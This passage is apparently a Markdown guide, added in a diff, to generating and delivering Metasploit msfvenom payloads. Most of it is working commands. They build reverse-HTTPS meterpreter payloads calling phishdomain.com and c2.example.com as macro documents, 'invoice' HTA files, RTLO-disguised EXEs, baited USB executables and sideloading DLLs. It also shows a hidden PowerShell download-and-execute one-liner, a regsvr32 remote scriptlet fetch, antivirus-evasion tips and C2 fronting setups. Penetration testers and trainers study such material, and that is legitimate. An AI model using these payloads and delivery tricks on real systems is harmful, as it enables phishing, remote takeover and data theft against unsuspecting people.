+| **Naming**               | `meterpreter/reverse_tcp`                                      | `meterpreter_reverse_tcp`                       |
+
+**Decision flow**: If you have a buffer overflow with 100 bytes of space → staged.
+If you're sending a phishing email attachment → stageless.
+If you're unsure → **stageless**.
+
+---
+
+## Real-World Delivery Techniques
+
+### Email Phishing Attachments
+
+```bash
+# Office macro document (Word/Excel)
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=phishdomain.com LPORT=443 \
+  -f vba -o macro.txt
+
+# HTA attachment (bypasses some macro restrictions)
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=phishdomain.com LPORT=443 \
+  -f hta-psh -o invoice.hta
+
+# Compiled EXE disguised with right-to-left override (RTLO) in filename
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=phishdomain.com LPORT=443 \
+  -f exe -o update‮fdp.exe  # appears as update.pdf.exe visually
+```
+
+### Web Delivery (No File Drop)
+
+```bash
+# Generate a download-and-execute PowerShell command
+# Use msfconsole web_delivery module for client-side execution:
+msf6 > use exploit/multi/script/web_delivery
+msf6 exploit(web_delivery) > set PAYLOAD python/meterpreter/reverse_https
+msf6 exploit(web_delivery) > set LHOST 10.10.10.10
+msf6 exploit(web_delivery) > set LPORT 8443
+msf6 exploit(web_delivery) > set TARGET 2  # PS1 target
+msf6 exploit(web_delivery) > exploit
+# Delivers a one-liner like: powershell -nop -w hidden -c IEX (New-Object Net.WebClient).downloadString('http://...')
+```
+
+### USB / Physical Drop
+
+```bash
+# AutoRun-compatible executable (legacy but still works in some environments)
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=c2.example.com LPORT=443 \
+  -f exe -o autorun.exe
+
+# Name it something enticing on the USB: "Employee_Salaries_2026.exe"
+# Add icon resources with a tool like Resource Hacker for legitimacy
+```
+
+### LOLBAS / Living Off The Land
+
+```bash
+# Generate a DLL for rundll32.exe sideloading
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=c2.example.com LPORT=443 \
+  -f dll -o propsys.dll  # mimic a common Windows DLL name
+
+# Target execution: rundll32.exe propsys.dll,Control_RunDLL
+# Or for regsvr32: regsvr32 /s /u /i:http://server/payload.sct scrobj.dll
+```
+
+---
+
+## Troubleshooting & Common Errors
+
+### Error: `Payload generation failed` / Invalid payload name
+
+```bash
+# Verify payload exists
+msfvenom -l payloads | grep -i "your_payload_name"
+
+# Check architecture matches platform (x64 payload on x86 platform fails)
+msfvenom -p windows/x64/meterpreter_reverse_https --list-options | grep ARCH
+```
+
+### Error: `Invalid format` / Format not found
+
+```bash
+# List supported formats
+msfvenom --list formats
+
+# Common format selection by goal:
+# exe = Windows executable
+# elf = Linux executable
+# macho = macOS executable
+# dll = Windows DLL
+# raw = Raw shellcode bytes
+# c, python, csharp, ps1 = Language-formatted shellcode
+# vba = Visual Basic macro
+# vbs = VBScript
+# hta-psh = HTA with PowerShell
+# asp, aspx = Active Server Pages
+# jsp, war = Java web payloads
+# apk = Android package
+# msi = Windows installer
+# jar = Java archive
+```
+
+### Error: Handler receives no callback
+
+| Check                         | Action                                                                 |
+| ----------------------------- | ---------------------------------------------------------------------- |
+| LHOST reachable?              | `nc -zv <LHOST> <LPORT>` from target network                           |
+| Firewall on target?           | `netsh advfirewall firewall` or `iptables -L`                          |
+| Handler running?              | `msf6 > jobs` — handler should show as active                          |
+| Payload matches handler?      | Check PAYLOAD name character-for-character                             |
+| Staged vs Stageless mismatch? | Staged payload needs staged handler; stageless needs stageless handler |
+| HTTPS cert issues?            | Try with `StagerVerifySSLCert false` first                             |
+
+### Error: AV detection immediately
+
+- **Don't rely on msfvenom encoding alone** for AV evasion
+- Use custom loaders with process injection (VirtualAlloc → WriteProcessMemory → CreateRemoteThread)
+- Consider in-memory execution (PowerShell reflection, .NET assembly loading)
+- Sleep/obfuscation techniques before payload execution
+- Sign your binary with a valid code signing cert where possible
+
+### Checking Generated Payload Details
+
+```bash
+# Check file type
+file payload.exe
+
+# Check payload size (staged vs stageless sanity check)
+ls -la payload.exe
+
+# Extract strings (see if LHOST/LPORT are visible in plaintext)
+strings payload.exe | grep -i "10.10.10"
+
+# Examine with hex editor / disassembler
+xxd payload.exe | head -20
+```
+
+---
+
+## Quick Reference Tables
+
+### Output Formats
+
+| Format        | Platform    | Use Case                               |
+| ------------- | ----------- | -------------------------------------- |
+| `exe`         | Windows     | Standard Windows executable            |
+| `exe-service` | Windows     | Windows service executable             |
+| `exe-small`   | Windows     | Smaller executable (limited features)  |
+| `dll`         | Windows     | Dynamic link library for sideloading   |
+| `msi`         | Windows     | Windows installer package              |
+| `msi-nouac`   | Windows     | MSI that bypasses UAC prompt           |
+| `elf`         | Linux       | Standard Linux executable              |
+| `macho`       | macOS       | Standard macOS executable              |
+| `apk`         | Android     | Android application package            |
+| `jar`         | Java        | Java archive (cross-platform)          |
+| `war`         | Java web    | Web application archive (Tomcat/JBoss) |
+| `jsp`         | Java web    | JavaServer Pages                       |
+| `asp`         | Windows web | Classic ASP                            |
+| `aspx`        | Windows web | ASP.NET web form                       |
+| `php`         | PHP web     | PHP script                             |
+| `vba`         | Windows     | Visual Basic for Applications macro    |
+| `vbs`         | Windows     | VBScript                               |
+| `hta-psh`     | Windows     | HTML Application with PowerShell       |
+| `ps1`         | Windows     | PowerShell script                      |
+| `raw`         | Any         | Raw shellcode bytes                    |
+| `c`           | Any         | C byte array                           |
+| `csharp`      | Any         | C# byte array                          |
+| `python`      | Any         | Python byte array                      |
+| `js_be`       | Any         | JavaScript byte array                  |
+| `hex`         | Any         | Hexadecimal string                     |
+
+### Architecture Flags
+
+| Architecture | Platforms             | Notes                                           |
+| ------------ | --------------------- | ----------------------------------------------- |
+| `x86`        | Windows, Linux        | 32-bit Intel/AMD; widely compatible             |
+| `x64`        | Windows, Linux, macOS | 64-bit; preferred for modern systems            |
+| `aarch64`    | Linux, macOS          | ARM 64-bit (Apple Silicon, ARM servers)         |
+| `armle`      | Linux, Android        | ARM 32-bit little-endian (Raspberry Pi, mobile) |
+| `mipsbe`     | Linux                 | MIPS big-endian (routers, embedded)             |
+| `mipsle`     | Linux                 | MIPS little-endian (some embedded)              |
+
+### Common LHOST/LPORT Scenarios
+
+| Scenario     | LHOST Value                             | LPORT Value       | Notes                                    |
+| ------------ | --------------------------------------- | ----------------- | ---------------------------------------- |
+| Direct LAN   | Your LAN IP (e.g., `192.168.1.10`)      | Any free port     | Simplest; works on same network          |
+| Public VPS   | Public VPS IP/domain                    | 443 or 8443       | Register a domain for legitimacy         |
+| CDN Front    | CDN domain (e.g., `abc.cloudfront.net`) | 443               | Use `HttpHostHeader` for backend         |
+| SSH tunnel   | `localhost` or tunneled port            | Tunnel local port | Forward via `ssh -R`                     |
+| DNS redirect | Redirector domain                       | 443               | Socat/nginx on redirector forwards to TS |
+
+---
+
+## Sources & Further Reading
+
+- **Metasploit Unleashed** — Free Metasploit course: https://www.offensive-security.com/metasploit-unleashed/
+- **MSFvenom Official Documentation** — https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
+- **Metasploit Payloads Reference** — https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom
+- **LOLBAS Project** — Living Off The Land binaries: https://lolbas-project.github.io/
+- **PayloadsAllTheThings** — Comprehensive payload collection: https://github.com/swisskyrepo/PayloadsAllTheThings
+- **Staged vs Stageless Deep Dive** — https://docs.metasploit.com/docs/using-metasploit/basics/understanding-payloads.html
